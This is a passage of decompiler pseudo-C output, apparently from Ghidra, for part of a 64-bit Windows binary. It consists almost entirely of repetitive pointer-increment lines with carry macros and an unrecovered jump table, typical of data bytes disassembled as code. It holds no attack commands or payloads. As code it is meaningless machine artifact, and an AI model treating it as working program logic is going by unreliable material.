+ uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = iVar58 + 0x11;\n        *puVar84 = *puVar84 ^ uVar64;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 >> 0x11;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        uVar72 = puVar71 >> 8;\n        *unaff_RSI = *unaff_RSI ^ uVar72;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar72;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar72);\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *unaff_RSI = *unaff_RSI ^ uVar72;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar72;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar72);\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = piVar60 + 0x3a;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar40);\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar72;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar72);\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *(piVar60 + 0x140115f) = *(piVar60 + 0x140115f) + uVar65;\n        *piVar60 = *piVar60 + uVar40;\n        *(piVar60 + 0x140113a) = *(piVar60 + 0x140113a) + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = piVar60 + 0x33;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar80;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar80);\n        *piVar60 = *piVar60 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar72;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        pcVar53 = arg1 & 0xffffffffffffff00 | uVar64 + uVar41;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar42 = *piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar42, uVar40);\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 * '\\x02';\n        piVar60 = uVar55 | uVar40;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        piVar60 = uVar55 | uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        cVar39 = *pcVar53;\n        *pcVar53 = *pcVar53 << 1;\n        iVar83 = piVar60;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + (cVar39 < '\\0');\n        *piVar60 = *piVar60 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar72;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = arg1 & 0xffffffffffffff00 | uVar64 + uVar41 + *piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar40);\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        piVar60 = uVar55 | uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *puVar84 = *puVar84 ^ 0x11;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        pcVar53 = uVar55 | uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar80;\n        *(pcVar53 + 1) = *(pcVar53 + 1) + pcVar53;\n        *pcVar53 = *pcVar53 + uVar40;\n        uVar41 = *puVar71;\n        *puVar71 = *puVar71 + uVar40;\n        *pcVar53 = (*pcVar53 - uVar40) - CARRY1(uVar41, uVar40);\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        pcVar53[0x140115f] = pcVar53[0x140115f] + uVar65;\n        *pcVar53 = *pcVar53 + uVar40;\n        puVar84 = pcVar53 + 0x3b;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        *(pcVar53 + 1) = *(pcVar53 + 1) + pcVar53 + CARRY1(uVar41, uVar40);\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *pcVar53 = *pcVar53 + uVar40;\n        uVar40 = uVar40 + uVar72;\n        piVar60 = uVar55 | uVar40;\n        uVar65 = uVar65 & *0x14010b248;\n        puVar71 = uVar65;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        piVar61 = uVar55 | uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar80;\n        iVar83 = piVar61;\n        *(piVar61 + 1) = *(piVar61 + 1) + iVar83;\n        *piVar61 = *piVar61 + uVar40;\n        uVar41 = *puVar71;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar61 = (*piVar61 - uVar40) - CARRY1(uVar41, uVar40);\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        uVar64 = uVar65;\n        *(piVar61 + 0x140115f) = *(piVar61 + 0x140115f) + uVar64;\n        *piVar61 = *piVar61 + uVar40;\n        *(piVar61 + 0x140113b) = *(piVar61 + 0x140113b) + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        piVar60 = piVar61 + 0xd;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar64;\n        *(piVar61 + 1) = *(piVar61 + 1) + iVar83 + CARRY1(uVar41, uVar64);\n        *piVar61 = *piVar61 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        *piVar61 = *piVar61 + uVar40;\n        cVar73 = puVar71 >> 8;\n        *piVar61 = *piVar61 + cVar73;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar61 = *piVar61 + iVar83;\n        *piVar61 = *piVar61 + uVar40;\n        uVar4 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffff0000;\n        uVar55 = CONCAT11(uVar80 + *piVar61, uVar40);\n        puVar84 = uVar4 | uVar55;\n        *puVar84 = *puVar84 + uVar40;\n        *puVar84 = *puVar84 + uVar40;\n        *puVar84 = *puVar84 + uVar40;\n        *puVar84 = *puVar84 + uVar40;\n        *puVar84 = *puVar84 + uVar40;\n        *puVar84 = *puVar84 + uVar40;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        *(puVar84 + 1) = *(puVar84 + 1) + puVar84 + CARRY1(uVar41, uVar40);\n        *puVar84 = *puVar84 + uVar40;\n        uVar40 = uVar40 * '\\x02';\n        uVar55 = uVar55 & 0xffffffffffffff00;\n        uVar67 = uVar4 | uVar55;\n        piVar60 = uVar67 | uVar40;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        piVar60 = uVar67 | uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        uVar42 = uVar55 >> 8;\n        puVar71[0x14010b248] = puVar71[0x14010b248] + uVar42 + CARRY1(uVar41, uVar40);\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + *piVar60;\n        piVar60 = uVar67 | uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar42;\n        *(piVar60 + 1) = *(piVar60 + 1) + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *puVar71 = *puVar71 + uVar40;\n        *piVar60 = *piVar60 & uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *(piVar60 + 0x140115f) = *(piVar60 + 0x140115f) + uVar64;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        pcVar53 = uVar67 | uVar40 + *piVar60;\n        *pcVar53 = *pcVar53 + uVar40 + *piVar60;\n        piVar60 = pcVar53 ^ 0x11;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + piVar60;\n        uVar41 = piVar60 + *piVar60;\n        piVar61 = uVar67 | uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar42;\n        iVar83 = piVar61;\n        *(piVar61 + 1) = *(piVar61 + 1) + iVar83;\n        *piVar61 = *piVar61 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar61 = *piVar61 & uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *(piVar61 + 0x140115f) = *(piVar61 + 0x140115f) + uVar64;\n        *piVar61 = *piVar61 + uVar41;\n        piVar60 = piVar61 + 0xf;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar61 + 1) = *(piVar61 + 1) + iVar83 + CARRY1(uVar40, uVar41);\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        piVar60 = piVar61 + 9;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar64;\n        *(piVar61 + 1) = *(piVar61 + 1) + iVar83 + CARRY1(uVar40, uVar64);\n        *piVar61 = *piVar61 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + uVar41;\n        *piVar61 = *piVar61 + cVar73;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar61 = *piVar61 + iVar83;\n        *piVar61 = *piVar61 + uVar41;\n        uVar55 = CONCAT11(uVar42 + *piVar61, uVar41);\n        puVar84 = uVar4 | uVar55;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar41;\n        *(puVar84 + 1) = *(puVar84 + 1) + puVar84 + CARRY1(uVar40, uVar41);\n        *puVar84 = *puVar84 + uVar41;\n        puVar84[0x140113c] = puVar84[0x140113c] + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *puVar84 = *puVar84 + uVar41;\n        uVar55 = uVar55 & 0xffffffffffffff00;\n        uVar4 = uVar4 | uVar55;\n        piVar60 = (uVar4 | uVar41 + uVar64) ^ 0x11;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + piVar60;\n        uVar41 = piVar60 + *piVar60;\n        pcVar53 = uVar4 | uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar42 = uVar55 >> 8;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar42;\n        *(pcVar53 + 1) = *(pcVar53 + 1) + pcVar53;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar41;\n        *pcVar53 = (*pcVar53 - uVar41) - CARRY1(uVar40, uVar41);\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        pcVar53[0x140115f] = pcVar53[0x140115f] + uVar64;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar41 = uVar41 * '\\x02';\n        piVar60 = uVar4 | uVar41;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        uVar41 = uVar41 + *piVar60;\n        pcVar53 = uVar4 | uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar55 = uVar41 & 0xffffffffffffff11;\n        piVar60 = uVar4 | uVar55;\n        *piVar60 = *piVar60 + piVar60;\n        cVar39 = uVar55;\n        *piVar60 = *piVar60 + cVar39;\n        uVar41 = cVar39 + *piVar60;\n        pcVar53 = uVar4 | uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar42;\n        *(pcVar53 + 1) = *(pcVar53 + 1) + pcVar53;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar41;\n        *pcVar53 = (*pcVar53 - uVar41) - CARRY1(uVar40, uVar41);\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        pcVar53[0x140115f] = pcVar53[0x140115f] + uVar64;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        pcVar62 = uVar4 | uVar41 + *pcVar53;\n        *pcVar62 = *pcVar62 + uVar41 + *pcVar53;\n        LOCK();\n        piVar60 = pcVar62 ^ 0x11;\n        *piVar60 = *piVar60 + piVar60;\n        *piVar60 = *piVar60 + piVar60;\n        uVar41 = piVar60 + *piVar60;\n        piVar60 = uVar4 | uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ uVar42;\n        uVar51 = piVar60;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar51;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = (*piVar60 - uVar41) - CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 0x140115f) = *(piVar60 + 0x140115f) + uVar64;\n        *piVar60 = *piVar60 + uVar41;\n        puVar84 = piVar60 + 0x3d;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar51 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 0x500449) = *(piVar60 + 0x500449) + cVar73;\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + cVar73;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar60 = *piVar60 + uVar51;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar51 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 0x140113d) = *(piVar60 + 0x140113d) + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar64;\n        uVar51 = uVar51 ^ 0x14011;\n        pcVar53 = uVar51;\n        *pcVar53 = *pcVar53 + uVar51;\n        uVar41 = uVar51 + *pcVar53;\n        uVar49 = uVar51 & 0xffffff00;\n        pcVar53 = uVar49 | uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ pcVar53 >> 8;\n        *(pcVar53 + 1) = *(pcVar53 + 1) + (uVar49 | uVar41);\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41 + CARRY1(uVar40, uVar41);\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        pcVar53[0x140115f] = pcVar53[0x140115f] + uVar64;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar41 = uVar41 * '\\x02';\n        pcVar53 = uVar49 | uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        uVar41 = uVar41 + *pcVar53;\n        piVar60 = uVar49 | uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        puVar71[0x14010b248] = puVar71[0x14010b248] << 1;\n        *piVar60 = *piVar60 + (uVar49 | uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        uVar41 = uVar41 + *piVar60;\n        uVar49 = uVar49 | uVar41;\n        piVar60 = uVar49;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ piVar60 >> 8;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 0x140115f) = *(piVar60 + 0x140115f) + uVar64;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        puVar84 = piVar60 + 0x35;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar64;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar64);\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + cVar73;\n        *0x14010b248 = *0x14010b248 & uVar65;\n        *piVar60 = *piVar60 + uVar49;\n        *piVar60 = *piVar60 + uVar41;\n        uVar64 = uVar64 + *piVar60;\n        uVar50 = uVar65 & 0xffffff00 | uVar64;\n        puVar71 = uVar50;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        puVar84 = piVar60 + 0x3e;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *puVar71 = *puVar71 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar64;\n        pcVar53 = uVar49 & 0x14011;\n        cVar39 = uVar49 & 0x14011;\n        *pcVar53 = *pcVar53 + cVar39;\n        uVar42 = cVar39 + *pcVar53;\n        uVar49 = uVar51 & 0x14000 | uVar42;\n        piVar60 = uVar49;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 ^ piVar60 >> 8;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49;\n        *piVar60 = *piVar60 + uVar42;\n        uVar40 = *puVar71;\n        *puVar71 = *puVar71 + uVar42;\n        *piVar60 = *piVar60 + uVar42 + CARRY1(uVar40, uVar42);\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *(piVar60 + 0x140115f) = *(piVar60 + 0x140115f) + uVar64;\n        *piVar60 = *piVar60 + uVar42;\n        *(piVar60 + 0x140113e) = *(piVar60 + 0x140113e) + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *puVar71 = *puVar71 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        puVar84 = piVar60 + 0x36;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar42;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar42);\n        *piVar60 = *piVar60 + uVar42;\n        *puVar71 = *puVar71 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + (puVar71 >> 8);\n        *0x14010b248 = *0x14010b248 & uVar50;\n        *piVar60 = *piVar60 + uVar49;\n        *piVar60 = *piVar60 + uVar42;\n        uVar64 = uVar64 + *piVar60;\n        uVar50 = uVar65 & 0xffffff00 | uVar64;\n        pcVar53 = uVar50;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        *piVar60 = *piVar60 + uVar42;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar42;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar42);\n        *piVar60 = *piVar60 + uVar42;\n        uVar41 = uVar42 * '\\x02';\n        uVar49 = uVar51 & 0x14000 | uVar41;\n        piVar60 = uVar49;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar42, uVar42);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        puVar84 = piVar60 + 0x25;\n        uVar40 = *puVar84;\n        *puVar84 = *puVar84 + uVar64;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar64);\n        *piVar60 = *piVar60 + uVar41;\n        *pcVar53 = *pcVar53 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + (pcVar53 >> 8);\n        *0x14010b248 = *0x14010b248 & uVar50;\n        *piVar60 = *piVar60 + 